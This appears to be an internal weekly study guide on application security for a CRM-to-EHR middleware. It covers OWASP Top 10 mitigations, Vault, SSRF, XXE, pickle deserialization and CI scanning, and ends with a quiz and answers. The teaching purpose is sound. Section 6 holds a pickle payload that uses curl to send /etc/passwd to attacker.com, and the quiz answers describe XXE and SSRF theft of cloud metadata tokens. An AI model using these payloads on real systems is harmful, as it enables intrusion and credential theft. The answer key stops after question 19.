# Week 26 — Application Security & Secure Design

**Week of:** November 30, 2026
**Estimated study time:** ~2 hours
**Tags:** `security` `owasp` `appsec`

---

## Overview

Application security is not a feature you bolt on at the end — it is a design constraint that shapes every layer of your system. For engineers working on integration platforms that carry sensitive data, the stakes are especially high. The crm-middleware sits at the exact intersection of Salesforce (CRM with policy/patient data), the EHR system (a regulated healthcare backend), and GCP/GKE infrastructure. Every inbound request from Salesforce and every outbound call to the EHR system passes through code you write. A single injection flaw, misconfigured secret, or unvalidated redirect can expose protected health information, policy records, or internal network topology.

This week maps the OWASP Top 10 (2021 edition) to concrete patterns you will recognize in FastAPI and SQLAlchemy code. The goal is not to memorize CVE numbers but to internalize *why* each class of vulnerability exists and what the minimal effective mitigation looks like. You will see how Vault secret rotation changes the threat model for long-lived credentials, how parameterized queries eliminate SQL injection at the driver level, and how SSRF turns your own middleware into a pivot point against the EHR system's internal network.

Secure design goes beyond fixing known attack classes. Threat modeling — systematically asking "what can go wrong, who can make it go wrong, and what is the impact" — gives you a structured way to find gaps before an attacker does. Applied to the Salesforce→middleware→EHR data flow, threat modeling surfaces risks like Apex trigger replay attacks, unauthenticated admin panel exposure, and overly broad Vault policies. You will work through a lightweight STRIDE model applied to the integration platform at the end of the sectional content.

Finally, security must live in CI/CD. Dependency scanning, SAST linting, and secret-leak detection are cheapest when they run on every pull request. This week gives you the tooling vocabulary and the configuration snippets to wire these checks into a GitHub Actions pipeline — the same pipeline pattern used for crm-middleware deployments.

---

## 1. OWASP Top 10 (2021) — Mechanisms and Mitigations

The OWASP Top 10 is a ranked list of the most critical web application security risks. The 2021 edition reshuffled the list significantly; understanding *why* each category exists helps you recognize its variants in your own codebase.

| Rank | Category | Core Mechanism | Primary Mitigation |
|------|----------|---------------|-------------------|
| A01 | Broken Access Control | Missing authz checks; IDOR | Enforce at data layer, not UI |
| A02 | Cryptographic Failures | Plaintext storage; weak ciphers | TLS everywhere; AES-256 at rest |
| A03 | Injection | Untrusted data as commands | Parameterized queries; strict parsing |
| A04 | Insecure Design | Missing threat model | STRIDE; defense in depth |
| A05 | Security Misconfiguration | Default credentials; verbose errors | Hardened configs; secret rotation |
| A06 | Vulnerable & Outdated Components | Unpatched deps | Dependency scanning in CI |
| A07 | Identification & Authentication Failures | Weak sessions; no MFA | Short-lived tokens; MFA |
| A08 | Software & Data Integrity Failures | Unsigned artifacts; insecure deserialization | Signed images; avoid pickle |
| A09 | Security Logging & Monitoring Failures | No audit trail | Structured logs → SIEM |
| A10 | SSRF | Unvalidated outbound URLs | Allowlist; metadata block |

**Integration platform connection:** A03 (Injection) is mitigated by SQLAlchemy ORM. A10 (SSRF) is the highest-priority risk in the middleware because every `POST /clients` call from Salesforce triggers an outbound HTTP call to the EHR system using a URL that is partially derived from configuration — if that configuration can be influenced by input, you have SSRF.

**Common mistake:** Treating OWASP Top 10 as a checklist to complete once rather than a lens to apply continuously. New endpoints, new integrations, and dependency upgrades all re-open previously mitigated risks.

---

## 2. Input Validation and Parameterized Queries

Input validation is the first line of defense. Every field that enters your system from an external source — a Salesforce webhook payload, a query parameter, a JSON body — must be validated for type, shape, length, and allowed character set *before* it touches business logic or a database.

### Pydantic schema validation in FastAPI

FastAPI's dependency on Pydantic means you get input validation essentially for free if you define your schemas correctly. The key is to make schemas as *narrow* as possible — accept only what you explicitly expect, reject everything else.

```python
from pydantic import BaseModel, Field, field_validator
import re

EHR_CLIENT_ID_PATTERN = re.compile(r"^[A-Z0-9\-]{6,20}$")

class SyncClientRequest(BaseModel):
    ehr_client_id: str = Field(..., min_length=6, max_length=20)
    salesforce_account_id: str = Field(..., min_length=15, max_length=18)
    operation: Literal["create", "update", "delete"]

    @field_validator("ehr_client_id")
    @classmethod
    def validate_ehr_id_format(cls, v: str) -> str:
        if not EHR_CLIENT_ID_PATTERN.match(v):
            raise ValueError("ehr_client_id contains invalid characters")
        return v
```

Pydantic will reject requests with missing fields, wrong types, or fields that violate `Field` constraints — these become 422 responses before your handler runs. The `field_validator` adds domain-specific rules the type system cannot express.

### SQLAlchemy parameterized queries

Never concatenate user input into SQL strings. SQLAlchemy's ORM and `text()` with `bindparams` both send the query and the data separately to the database driver, making injection structurally impossible.

```python
from sqlalchemy import text
from sqlalchemy.orm import Session

# WRONG — string interpolation, injectable
def get_client_bad(db: Session, client_id: str):
    return db.execute(f"SELECT * FROM clients WHERE ehr_id = '{client_id}'")

# CORRECT — parameterized via ORM
def get_client_orm(db: Session, client_id: str):
    return db.query(Client).filter(Client.ehr_id == client_id).first()

# CORRECT — parameterized via raw SQL when ORM is insufficient
def get_client_raw(db: Session, client_id: str):
    stmt = text("SELECT * FROM clients WHERE ehr_id = :cid")
    return db.execute(stmt, {"cid": client_id}).fetchone()
```

**Common mistake:** Using `text()` with f-strings: `text(f"WHERE id = '{client_id}'")`. This defeats the entire purpose — the `:param` syntax is the parameterization mechanism.

---

## 3. Secrets Management with Vault

Secrets in environment variables are an improvement over hardcoded values, but they still appear in process lists, Docker inspect output, and CI logs if you are not careful. HashiCorp Vault provides dynamic, short-lived secrets with fine-grained policies, audit logging, and automatic rotation.

### Vault dynamic database credentials

Instead of a static PostgreSQL password, Vault generates a unique username/password pair for each lease. When the lease expires, the credentials are revoked. A compromised credential expires on its own.

```python
import hvac
from functools import lru_cache

@lru_cache(maxsize=1)
def get_vault_client() -> hvac.Client:
    client = hvac.Client(url="https://vault.internal:8200")
    # In GKE, authenticate via GCP IAM role
    client.auth.gcp.login(role="crm-middleware", jwt=_get_instance_jwt())
    return client

def get_db_credentials() -> dict:
    vault = get_vault_client()
    secret = vault.secrets.database.generate_credentials(name="crm-middleware-role")
    return {
        "username": secret["data"]["username"],
        "password": secret["data"]["password"],
    }
```

### Vault policies — principle of least privilege

A Vault policy should grant exactly the paths and capabilities your service needs — nothing more. The crm-middleware needs to read the EHR API key and generate database credentials. It should *not* have access to ETL secrets or infrastructure PKI paths.

```hcl
# crm-middleware policy
path "secret/data/crm-middleware/ehr-api-key" {
  capabilities = ["read"]
}

path "database/creds/crm-middleware-role" {
  capabilities = ["read"]
}

# Explicitly deny everything else
path "*" {
  capabilities = ["deny"]
}
```

### Secret rotation strategy

Vault lease renewal keeps credentials alive across application restarts without human intervention, but you need to handle lease expiry in your connection pool:

```python
from sqlalchemy import event
from sqlalchemy.engine import Engine

def refresh_credentials_on_disconnect(engine: Engine):
    @event.listens_for(engine, "connect")
    def receive_connect(dbapi_connection, connection_record):
        # Refresh Vault lease before creating a new connection
        creds = get_db_credentials()
        connection_record.info["vault_creds"] = creds
```

**Integration platform connection:** The EHR API key (used for every outbound call to `ehr-server-prod`) lives in Vault under `secret/data/crm-middleware/ehr-api-key`. If the middleware reads this once at startup and caches it indefinitely, a rotated key breaks all EHR callouts silently. Always read from Vault per-request (with caching at the HTTP client level with TTL matching the lease duration).

**Common mistake:** Storing Vault tokens in environment variables. The token itself is a secret. Use IAM-based authentication (GCP workload identity in GKE) so the service never has to manage a Vault token bootstrap problem.

---

## 4. SSRF — Server-Side Request Forgery

SSRF occurs when an attacker can cause your server to make HTTP requests to an unintended destination. The attacker does not need external access to the target — they *use your server* as a proxy. In GKE, an SSRF vulnerability can expose:

- The GCP metadata endpoint (`169.254.169.254`) — returns service account tokens
- Internal Kubernetes services (`http://vault.internal:8200`)
- The EHR system's internal network topology (via crafted EHR API paths)

### The integration platform SSRF risk surface

The middleware constructs EHR API URLs from configuration and request parameters:

```python
# Dangerous pattern — base URL partially from request data
def build_ehr_url(endpoint: str, client_id: str) -> str:
    return f"{settings.EHR_BASE_URL}/{endpoint}/{client_id}"
```

If `client_id` contains `../../../internal-service`, the constructed URL escapes the intended path. If `settings.EHR_BASE_URL` can be influenced by environment injection (a compromised ConfigMap), the entire base can be redirected.

### Mitigations

```python
import ipaddress
import urllib.parse
from fastapi import HTTPException

ALLOWED_EHR_HOSTS = frozenset(["ehr-server-prod.internal", "ehr-server-dev.internal"])

def validate_ehr_url(url: str) -> str:
    """Validate that a constructed EHR URL points to an allowed host."""
    parsed = urllib.parse.urlparse(url)
    
    # Reject non-HTTPS
    if parsed.scheme != "https":
        raise HTTPException(status_code=400, detail="Only HTTPS EHR URLs are permitted")
    
    # Enforce allowlist of EHR hostnames
    if parsed.hostname not in ALLOWED_EHR_HOSTS:
        raise HTTPException(status_code=400, detail=f"Host {parsed.hostname} is not an allowed EHR endpoint")
    
    # Block private IP ranges (defense in depth against DNS rebinding)
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            raise HTTPException(status_code=400, detail="Private IP addresses are not permitted")
    except ValueError:
        pass  # Hostname, not IP — allowlist check above is sufficient
    
    return url

# Enforce URL-safe path segments only
SAFE_PATH_SEGMENT = re.compile(r"^[A-Za-z0-9\-_]+$")

def build_ehr_url(endpoint: str, client_id: str) -> str:
    if not SAFE_PATH_SEGMENT.match(client_id):
        raise ValueError(f"Invalid client_id for URL construction: {client_id!r}")
    url = f"{settings.EHR_BASE_URL}/{endpoint}/{client_id}"
    return validate_ehr_url(url)
```

Additionally, configure the GKE network policy to block metadata server access from the middleware pod:

```yaml
# NetworkPolicy: deny GCP metadata server egress
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-metadata-server
spec:
  podSelector:
    matchLabels:
      app: crm-middleware
  policyTypes:
    - Egress
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 169.254.169.254/32
```

**Common mistake:** Only validating user-supplied input and trusting configuration values blindly. A compromised ConfigMap or environment injection can set `EHR_BASE_URL` to an internal target. Always validate the final constructed URL, not just the components.

---

## 5. XXE — XML External Entity Injection

XXE exploits XML parsers that process external entity declarations. When a parser resolves `<!ENTITY xxe SYSTEM "file:///etc/passwd">`, it reads that file and injects its content into the document. XXE can lead to local file disclosure, SSRF (via `http://` entities), and denial of service (billion laughs attack).

FastAPI's default request parsing is JSON, so XXE is not an immediate concern for JSON endpoints. However, if you ever parse XML — from EHR SOAP responses, Salesforce SOAP API, or uploaded documents — you must disable external entity processing.

```python
from lxml import etree

def parse_ehr_xml_response(xml_bytes: bytes) -> etree._Element:
    # SAFE: disable all external entity processing
    parser = etree.XMLParser(
        resolve_entities=False,
        no_network=True,
        load_dtd=False,
    )
    try:
        return etree.fromstring(xml_bytes, parser=parser)
    except etree.XMLSyntaxError as e:
        raise ValueError(f"Malformed EHR XML response: {e}") from e
```

For Python's stdlib `xml.etree.ElementTree`, use `defusedxml` instead, which patches all stdlib XML parsers:

```python
import defusedxml.ElementTree as ET

tree = ET.fromstring(xml_bytes)  # Safe — defusedxml raises on XXE attempts
```

**Common mistake:** Using `lxml.etree.parse()` with default settings. The default `lxml` parser resolves external entities. Always instantiate `XMLParser` explicitly with the safe flags shown above.

---

## 6. Insecure Deserialization

Deserialization attacks exploit the fact that loading a serialized object can execute arbitrary code, particularly in formats like Python `pickle`, Java's native serialization, and PHP's `unserialize()`. An attacker who can control the serialized payload can achieve remote code execution.

### Pickle is code execution

```python
import pickle, os

class EvilPayload:
    def __reduce__(self):
        return (os.system, ("curl http://attacker.com/exfil?data=$(cat /etc/passwd)",))

# The moment you call pickle.loads() on attacker-controlled data, the shell runs.
payload = pickle.dumps(EvilPayload())
pickle.loads(payload)  # RCE
```

**Never use `pickle` for data that crosses a trust boundary.** Use JSON, MessagePack, or Protocol Buffers instead.

### Safe task queue payloads (Celery / Redis)

The integration platform uses async background tasks for EHR sync operations. If Celery is configured with the default pickle serializer, anyone who can write to the Redis task queue can execute arbitrary code in the middleware worker.

```python
# celery_app.py — enforce JSON serialization
from celery import Celery

app = Celery("crm-middleware")
app.conf.update(
    task_serializer="json",
    result_serializer="json",
    accept_content=["json"],  # Reject pickle, yaml, msgpack from untrusted sources
)
```

**Common mistake:** Accepting `accept_content=["json", "pickle"]` for backwards compatibility with old workers. The `accept_content` list controls what the *consumer* will deserialize — having pickle in there means a malicious producer can send a pickle payload and have it executed.

---

## 7. Dependency Scanning and Supply Chain Security

The dependency tree of a modern Python application can contain hundreds of transitive packages. A single compromised or vulnerable package can undermine all the application-level controls you have built. Dependency scanning should run automatically on every pull request.

### Tools

| Tool | What it checks | Integration |
|------|---------------|-------------|
| `pip-audit` | Known CVEs in installed packages | CI step |
| `safety` | PyPI advisory database | CI step |
| `trivy` | Container image CVEs + IaC misconfigs | CI on Dockerfile |
| `dependabot` | Automated PR for outdated deps | GitHub native |
| `pip-licenses` | License compliance | CI step |

### GitHub Actions integration

```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]

jobs:
  dependency-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.13"
      - run: pip install pip-audit
      - run: pip-audit --require-hashes -r requirements.txt

  container-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build image
        run: docker build -t crm-middleware:ci .
      - name: Trivy scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: "crm-middleware:ci"
          severity: "HIGH,CRITICAL"
          exit-code: "1"

  secret-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: main
```

**Common mistake:** Pinning dependencies with `==` in `requirements.txt` but never updating them. Pinning is good for reproducibility but means security patches never land. Use Dependabot or Renovate to automate PR creation for patch-level updates.

---

## 8. Mutual TLS (mTLS) Between Services

Standard TLS authenticates the *server* to the client. Mutual TLS (mTLS) requires both sides to present certificates, giving you cryptographic proof of service identity in addition to encryption. In GKE, mTLS between the middleware, ETL, and internal services prevents a compromised pod from impersonating a trusted service.

### The integration platform mTLS aspiration

Current state: services communicate over internal Kubernetes cluster networking with TLS to external endpoints. Target state: Istio service mesh or SPIFFE/SPIRE workload identity for pod-to-pod mTLS.

With Istio:

```yaml
# PeerAuthentication: require mTLS in the crm-middleware namespace
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: crm-middleware
spec:
  mtls:
    mode: STRICT
```

Without a service mesh, you can implement application-level mTLS in Python using `ssl`:

```python
import ssl
import httpx

def get_ehr_client(cert_path: str, key_path: str, ca_path: str) -> httpx.Client:
    """Build an httpx client with mTLS for EHR API calls."""
    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=ca_path)
    ctx.load_cert_chain(certfile=cert_path, keyfile=key_path)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_3
    return httpx.Client(ssl_context=ctx, timeout=30.0)
```

Certificate rotation is the operational challenge: short-lived certs (24h SPIFFE SVIDs) are more secure but require your application to handle cert reload without downtime.

**Common mistake:** Setting `verify=False` in httpx/requests clients to work around self-signed certificate errors during development. This disables server authentication entirely and is trivially exploitable via man-in-the-middle. Use a local CA bundle instead.

---

## 9. Security in CI/CD

A CI/CD pipeline with write access to production is itself a high-value target. Compromising a workflow can lead to secrets exfiltration, malicious artifact injection, or direct infrastructure access.

### Pipeline hardening checklist

```yaml
# Principle of least privilege for GitHub Actions tokens
permissions:
  contents: read
  id-token: write  # Only if OIDC auth to GCP is needed

jobs:
  deploy:
    steps:
      # Pin actions to full commit SHA, not tag (tag can be moved)
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
      
      # Use OIDC for GCP auth — no long-lived service account key in secrets
      - uses: google-github-actions/auth@6fc4af4b145ae7821d527454aa9bd537d1f2dc5f
        with:
          workload_identity_provider: "projects/123/locations/global/workloadIdentityPools/ci-pool/providers/github"
          service_account: "crm-deployer@crm-prod.iam.gserviceaccount.com"
      
      # Never print secrets in logs
      - name: Deploy
        run: |
          echo "Deploying to ${{ vars.ENVIRONMENT }}"  # var, not secret — OK to log
          # ${{ secrets.API_KEY }} would be masked but avoid interpolating into scripts
```

### SAST with Bandit

```yaml
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install bandit[toml]
      - run: bandit -r app/ -ll -ii --exit-zero -f json -o bandit-report.json
      - uses: actions/upload-artifact@v4
        with:
          name: bandit-report
          path: bandit-report.json
```

Bandit flags common Python security issues: `subprocess` with `shell=True`, hardcoded passwords, use of `assert` for security checks, insecure hash functions.

**Common mistake:** Using `--exit-zero` for Bandit in PR checks so it never blocks a merge. Set severity thresholds (`-ll -ii` = medium severity + medium confidence minimum) and let high-severity findings fail the build. Exit zero only for reporting, not gating.

---

## 10. Threat Modeling the CRM-EHR Integration Platform

Threat modeling is systematic enumeration of what can go wrong. The STRIDE framework categorizes threats: **S**poofing, **T**ampering, **R**epudiation, **I**nformation disclosure, **D**enial of service, **E**levation of privilege.

### Data flow diagram (text)

```
Salesforce Apex Trigger
       │ HTTPS + JWT (Named Credential)
       ▼
  [CRM Middleware] ──── PostgreSQL (queue tables)
       │                      │
       │ HTTPS + mTLS (aspirational)
       ▼
   EHR System BDE
       (ehr-server-prod / ehr-server-dev)
```

### STRIDE analysis

| Component | Threat | STRIDE | Mitigation |
|-----------|--------|--------|------------|
| Apex→Middleware JWT | Token replay from Salesforce | S | Short expiry (5 min); nonce/jti check |
| Middleware inbound API | Unauthenticated admin panel | E | IP allowlist + Vault-issued admin tokens |
| Middleware→EHR callout | SSRF to internal network | I | URL allowlist; NetworkPolicy |
| PostgreSQL queue table | Direct DB write bypasses API | T | Restrict DB user to app schema only |
| Vault token | Overly broad policy grants DB write | E | Least-privilege policy; audit log review |
| EHR response parsing | Malicious XML/JSON in EHR response | T | Schema validation on all EHR responses |
| CI/CD pipeline | Compromised workflow writes to prod | E | OIDC auth; branch protection; pin SHA |
| Dependency | Malicious package in supply chain | T | pip-audit + trivy in CI; hash pinning |

### Residual risks

The Salesforce Named Credential JWT is the trust anchor for all inbound requests. If an Apex developer deploys code that calls middleware endpoints directly (bypassing trigger business logic), there is no server-side check that the operation is *expected* for the given Salesforce context — only that the caller is authenticated. Adding an operation idempotency layer (tracking `sf_transaction_id` in the queue table) would allow detection of unexpected replays.

---

## 11. Key Concepts Summary

```
Application Security
├── Input Validation
│   ├── Pydantic schemas — type, length, pattern
│   └── Parameterized queries — SQLAlchemy ORM / text(:param)
├── Secrets Management
│   ├── Vault dynamic creds — no static DB passwords
│   ├── Least-privilege policies — per-service paths
│   └── Secret rotation — lease TTL < credential lifetime
├── Attack Classes
│   ├── SSRF — allowlist hosts; validate final URL; NetworkPolicy
│   ├── XXE — lxml XMLParser(resolve_entities=False); defusedxml
│   ├── Injection — parameterized; never f-string SQL
│   └── Deserialization — no pickle across trust boundary; Celery JSON-only
├── Supply Chain
│   ├── pip-audit / safety — CVE scanning
│   ├── trivy — container image CVEs
│   └── trufflehog — secret leak detection
├── Transport Security
│   ├── TLS — minimum 1.2; prefer 1.3
│   └── mTLS — service mesh (Istio) or application-level ssl.create_default_context
├── CI/CD Security
│   ├── Pinned action SHAs
│   ├── OIDC → no long-lived SA keys
│   ├── Bandit SAST
│   └── Least-privilege workflow tokens
└── Threat Modeling
    ├── STRIDE per data flow boundary
    ├── Trust anchors — identify and harden
    └── Residual risk register — document known gaps
```

---

## Quiz — 20 Questions

### Questions

**1.** What is the difference between authentication and authorization, and which OWASP Top 10 category covers each?

**2.** Why does SQLAlchemy's ORM prevent SQL injection even when the `client_id` value contains a single-quote character?

**3.** You receive an EHR XML response containing `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`. What attack is being attempted, and what is the exact mechanism that makes it dangerous?

**4.** A colleague suggests caching the Vault-issued EHR API key in a module-level variable at application startup to reduce latency. What is the security problem with this approach?

**5.** Explain how SSRF in the crm-middleware could be exploited to exfiltrate a GKE service account token, step by step.

**6.** What is the difference between `pickle.loads()` and `json.loads()` from a security perspective? Why can one lead to RCE and the other cannot?

**7.** In a GitHub Actions workflow, why should you pin action versions to full commit SHAs rather than tags like `@v4`?

**8.** Describe what `PeerAuthentication` with `mode: STRICT` does in Istio and what happens to a pod that tries to connect without a valid certificate.

**9.** What does `pip-audit --require-hashes` check, and why is the `--require-hashes` flag significant?

**10.** A new FastAPI endpoint accepts a `redirect_url` parameter and sends users there after completing a sync operation. What vulnerability does this introduce and how do you mitigate it?

**11.** What is the "billion laughs" attack and which XML feature does it exploit?

**12.** Explain the STRIDE acronym. For the crm-middleware, give one concrete example of a Tampering threat.

**13.** Why is `assert` a bad choice for enforcing security checks in Python?

**14.** What does Bandit's `-ll -ii` flag combination mean, and what is a reasonable CI policy for Bandit findings?

**15.** A Celery worker is configured with `accept_content=["json", "pickle"]`. Explain the attack surface this creates and how to close it.

**16.** In the context of Vault policies, what does the principle of least privilege mean concretely for the crm-middleware service?

**17.** What is DNS rebinding, and why does an allowlist of hostnames alone not fully prevent SSRF? What additional control addresses it?

**18.** Describe two ways that a compromised CI/CD pipeline could harm a production system, and one control that mitigates both.

**19.** The crm-middleware makes outbound calls to the EHR system using a URL constructed from `settings.EHR_BASE_URL` and a `client_id` path segment. A Kubernetes ConfigMap is compromised and `EHR_BASE_URL` is changed to point to an internal service. What is the vulnerability class, and what code-level control catches it?

**20.** What is a trust anchor in a threat model, and how does the Salesforce Named Credential JWT function as a trust anchor for the crm-middleware? What is one weakness in treating it as the sole trust anchor?

---

### Answers

??? note "Reveal Answers"

    **1.** Authentication verifies *who you are* (identity). Authorization verifies *what you are allowed to do* (permissions). OWASP A07 (Identification and Authentication Failures) covers authentication weaknesses like weak passwords, missing MFA, and insecure session tokens. OWASP A01 (Broken Access Control) covers authorization failures such as IDOR, missing role checks, and privilege escalation. Both must be enforced: a correctly authenticated user can still cause harm if authorization is absent.

    **2.** SQLAlchemy's ORM sends the query structure (the SQL template) and the parameter values as separate messages to the database driver using the DB-API 2.0 `execute(stmt, params)` protocol. The database engine receives them independently and treats the parameter value as literal data — never as SQL syntax. A single-quote in `client_id` is stored verbatim; it is never interpreted as a string delimiter by the SQL parser because the parser never sees the value in a context where it would parse SQL tokens.

    **3.** This is an XXE (XML External Entity) combined with SSRF. The `SYSTEM` keyword instructs the XML parser to fetch the URL and substitute the response text as the entity value. If the parser resolves it, it will make an HTTP GET to the GCP metadata server (`169.254.169.254`) and return the instance metadata — potentially including service account tokens and project configuration — in the parsed document or error output. The danger is that the *server* (middleware) makes the request, so it succeeds from within GKE's network even though the attacker has no direct access.

    **4.** Vault issues credentials with a lease TTL — after expiry, the credential is revoked and any call using it returns a 401 or 403 from the EHR system. If the key is cached at startup, the application runs correctly until the first rotation event, then fails silently until redeployment. More importantly, a Vault lease represents an active secret that should be auditable and revocable. Caching at the module level bypasses audit logging for ongoing usage and prevents emergency revocation from taking effect. Read the secret per-request with a short in-memory TTL (matching the Vault lease) instead.

    **5.** Step 1: The attacker controls a value that influences the URL constructed for an EHR API call — for example, via a crafted `client_id` that includes URL path traversal sequences. Step 2: The middleware constructs a URL that resolves to `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` with the appropriate `Metadata-Flavor: Google` header. Step 3: The middleware's HTTP client (httpx/requests) fetches this URL from within the GKE pod network, which has direct access to the metadata server. Step 4: The JSON response containing the service account OAuth token is returned to the attacker — either in the API response body, an error message, or a log line. Step 5: The attacker uses the token to authenticate as the GKE service account with whatever GCP IAM permissions it holds.

    **6.** `json.loads()` parses JSON text into Python primitive types (dicts, lists, strings, numbers, booleans, None). The JSON format has no mechanism to represent arbitrary objects or executable code — it is a pure data format. `pickle.loads()` reconstructs arbitrary Python objects from a binary stream. Python objects can define `__reduce__` or `__reduce_ex__` methods that specify a callable to invoke during unpickling — effectively arbitrary code execution. Since these methods run automatically during deserialization, loading a malicious pickle payload is equivalent to running the attacker's code with the process's privileges.

    **7.** Git tags are mutable references — the tag `v4` can be force-pushed to point to a different commit at any time by the action's author (or by an attacker who compromises the author's account). If your workflow uses `@v4`, a compromised update to that tag would run attacker-controlled code in your CI environment with access to all repository secrets. Pinning to a full commit SHA like `@11bd71901bbe5b1630ceea73d27597364c9af683` references an immutable object in Git's content-addressed store. The SHA cannot be changed without creating a different object with a different SHA.

    **8.** Istio's `PeerAuthentication` with `mode: STRICT` configures the Envoy sidecar proxies in the specified namespace to require that all incoming connections present a valid SPIFFE X.509 SVID certificate issued by the mesh's certificate authority. Plain TCP or TLS-without-client-cert connections are rejected at the sidecar level — they never reach the application container. A pod that attempts to connect without a valid certificate will have its connection dropped by the receiving sidecar, and the application will see a connection error or timeout. The mesh's CA issues short-lived SVIDs automatically to workloads with the appropriate ServiceAccount.

    **9.** `pip-audit` checks all installed packages against known CVE databases (PyPI advisory database, OSV). The `--require-hashes` flag enforces that every package in `requirements.txt` has a `--hash=sha256:...` annotation. This prevents a supply-chain attack where a package with the same name and version is substituted at install time — the hash verifies that the exact bytes you tested in development are what gets installed in CI and production. Without hash pinning, a compromised PyPI mirror or a version-squatting package could deliver malicious code even with correct version pins.

    **10.** This is an open redirect vulnerability. An attacker can craft a link to your endpoint with `redirect_url=https://evil.com/phish`, send it to a user, and after the legitimate sync completes the user is redirected to the attacker's site. Because the initial URL is your legitimate domain, link-checkers and email filters may allow it through. Mitigation: validate `redirect_url` against an allowlist of known safe destinations (e.g., only URLs on your own domain), or better, replace the URL parameter with an opaque token that maps to a pre-approved destination on the server side.

    **11.** The "billion laughs" (or XML bomb) attack exploits XML entity nesting. A DTD defines a chain of entities where each one expands to multiple copies of the previous: `&a;` expands to `&b;&b;&b;&b;&b;`, `&b;` expands similarly, and so on exponentially. A document that is kilobytes in size expands to gigabytes (or more) in memory when parsed, causing the parser — and potentially the host — to exhaust available memory. The underlying XML feature is the internal entity declaration (`<!ENTITY name "value">`). `defusedxml` and `lxml` with `resolve_entities=False` prevent this by refusing to expand entity references.

    **12.** STRIDE: **S**poofing (claiming a false identity), **T**ampering (modifying data or code), **R**epudiation (denying an action occurred), **I**nformation disclosure (leaking data), **D**enial of service (making a system unavailable), **E**levation of privilege (gaining unauthorized capabilities). For the crm-middleware, a concrete Tampering threat is: a compromised internal service (or a developer with direct DB access) writes records directly to the PostgreSQL sync queue, bypassing all validation and business logic in the middleware API, causing invalid or malicious data to be synced into the EHR system.

    **13.** In Python, `assert` statements are removed entirely when the interpreter runs in optimized mode (`python -O` or `PYTHONOPTIMIZE=1`). Many production containers and deployment toolchains enable optimization. This means `assert user.is_admin, "Admin required"` becomes a no-op and every user is treated as an admin. Use explicit `if/raise` constructs for security checks: `if not user.is_admin: raise HTTPException(status_code=403)`. This is immune to optimization flags and makes the security check visible and intentional.

    **14.** Bandit's `-l` sets the minimum severity level to report (`-l` = LOW, `-ll` = MEDIUM, `-lll` = HIGH). The `-i` flag sets the minimum confidence level (`-i` = LOW, `-ii` = MEDIUM, `-iii` = HIGH). So `-ll -ii` means "report issues of at least MEDIUM severity and at least MEDIUM confidence." A reasonable CI policy: fail the build on any HIGH severity + HIGH confidence finding; generate a report (not fail) for MEDIUM/MEDIUM; let developers review and annotate false positives with `# nosec` comments that are tracked in code review.

    **15.** Celery workers with `accept_content=["json", "pickle"]` will deserialize any task payload whose content type is `application/x-python-serialize` (pickle). Any process that can write to the Redis/RabbitMQ broker — including a compromised application pod, a developer with broker credentials, or an attacker who exploited a different service — can enqueue a malicious pickle payload. When a worker consumes it, the `__reduce__` method executes arbitrary code with the worker's OS privileges. To close this: set `accept_content=["json"]` and `task_serializer="json"` only. All task arguments must be JSON-serializable primitives.

    **16.** Least privilege for the crm-middleware means the Vault policy grants exactly the paths the service legitimately needs at runtime and nothing else. Concretely: read access to `secret/data/crm-middleware/ehr-api-key`; generate credentials from `database/creds/crm-middleware-role`; and no other paths. It should not be able to read ETL secrets, write to any Vault path, manage policies, or access PKI endpoints. The Vault role should also restrict which Kubernetes ServiceAccounts can authenticate to it — only the `crm-middleware` ServiceAccount in the `crm-middleware` namespace, not cluster-admin or other service accounts.

    **17.** DNS rebinding exploits the gap between hostname resolution at validation time and at request time. An attacker controls a domain (`evil.com`) that initially resolves to a public IP (passing your allowlist hostname check). After the TTL expires, they change the DNS record to resolve to `169.254.169.254` or an internal Kubernetes service IP. Your cached allowlist check passed at validation time, but the actual HTTP request resolves to the internal target. A hostname allowlist alone does not catch this because the allowlist check is on the domain name, not the resolved IP. The additional control is to resolve the hostname at validation time, check that the resolved IP is not in private/reserved ranges, and then use the resolved IP for the actual request — or use a network-level egress policy that blocks private IPs regardless of how a connection is initiated.

    **18.** First: a compromised pipeline could exfiltrate all repository secrets by adding a step that prints or POSTs them to an external server, then use those credentials to access production databases, Vault, or GCP. Second: it could inject malicious code into the built container image or Helm chart before pushing to the registry, causing backdoored code to run in production on the next deployment. One control that mitigates both: use Workload Identity Federation (OIDC) instead of long-lived service account keys stored as secrets. Without a secret in the repository, there is nothing to exfiltrate for GCP auth. For artifact integrity, combine OIDC with signed container images (Cosign/sigstore) verified at deploy time.

    **19.** This is SSRF via configuration injection. Even though the user-supplied `client_id` is validated, the base URL is treated as trusted configuration. When that configuration is compromised (via a writable ConfigMap), the base URL can be pointed at any internal address. The code-level control is to validate the *final constructed URL* — not just its components — against an allowlist of known-good hostnames every time before making the outbound request. The `validate_ehr_url()` function that checks `parsed.hostname in ALLOWED_EHR_HOSTS` catches this because the allowlist is hardcoded in application code, not in a ConfigMap that can be modified without a code deploy.

